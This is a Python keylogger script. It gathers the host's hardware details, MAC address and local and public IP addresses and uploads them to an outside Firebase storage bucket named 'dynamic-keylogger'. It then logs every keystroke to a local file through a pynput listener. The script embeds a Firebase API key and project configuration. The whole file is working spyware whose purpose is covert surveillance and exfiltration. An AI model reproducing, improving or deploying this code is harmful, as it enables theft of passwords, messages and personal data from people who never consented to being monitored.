from pynput.keyboard import Key, Listener
from datetime import datetime
import pyrebase
import wmi
from getmac import get_mac_address as gma
import socket
from requests import get

c = wmi.WMI()
my_system = c.Win32_ComputerSystem()[0]


a = "Manufacturer:"+my_system.Manufacturer
b = "System Model:"+my_system.Model
c = "System Name:"+my_system.Name
d = "Number Of Processors:"+str(my_system.NumberOfProcessors)
e = "System Type:"+str(my_system.SystemType)
g = "System Family:"+str(my_system.SystemFamily)
h = "System Mac Address:"+str(gma())
i1 = socket.gethostname()
i2 = "Local ip Address:"+str(socket.gethostbyname(i1))
k = "Wan ip Address:"+ str(get('https://api.ipify.org').content.decode('utf8'))
l = "Internet Service Provider:"

with open("basicinfo.txt", "w") as f:
    f.write(str(a))
    f.write("\n")
    f.write(str(b))
    f.write("\n")
    f.write(str(c))
    f.write("\n")
    f.write(str(d))
    f.write("\n")
    f.write(str(e))
    f.write("\n")
    f.write(str(g))
    f.write("\n")
    f.write(str(h))
    f.write("\n")
    f.write("Hostname"+str(i1))
    f.write("\n")
    f.write(str(i2))
    f.write("\n")
    f.write(str(k))
    f.write("\n")
    f.write(str(l))

config={
    "apiKey": "AIzaSyAmPSLJuJ4Iu_0DivgHDpa4ISN3PkwHPkY",
    "authDomain": "dynamic-keylogger.firebaseapp.com",
    "databaseURL": "https://dynamic-keylogger-default-rtdb.asia-southeast1.firebasedatabase.app",
    "projectId": "dynamic-keylogger",
    "storageBucket": "dynamic-keylogger.appspot.com",
    "messagingSenderId": "429407034014",
    "appId": "1:429407034014:web:147190dd74b8c754aef98f"
}

firebase = pyrebase.initialize_app(config)
storage = firebase.storage()

path_on_cloud = "Host/"+h+"/KeyLogged "+(str(datetime.now()))[:-7]+""
path_local = "keylogger.txt"
path_on_cloud = "Host/"+h+"/BasicInfo"
path_local = "basicinfo.txt"
storage.child(path_on_cloud).put(path_local)

count = 0
keys = []

with open("keylogger.txt", "a") as f:
    f.write("TimeStamp"+(str(datetime.now()))[:-7]+":\n")
    f.write("\n")


def on_press(key):
    global count, keys
    keys.append(key)
    count += 1
    if count >= 5:
        count = 0
        write_file(keys)
        keys = []


def on_release(key):
    if key == Key.esc:
        return False


def write_file(keys):
    with open("keylogger.txt", "a") as f:
        for idx, key in enumerate(keys):
            k = str(key).replace("'", "")
            if k.find("space") > 0 and k.find("backspace") == -1:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)


if __name__ == "__main__":
    with Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()

    with open("keylogger.txt", "a") as f:
        f.write("\n\n")
        f.write("--------------------------------------------------------------------")

        f.write("\n\n")

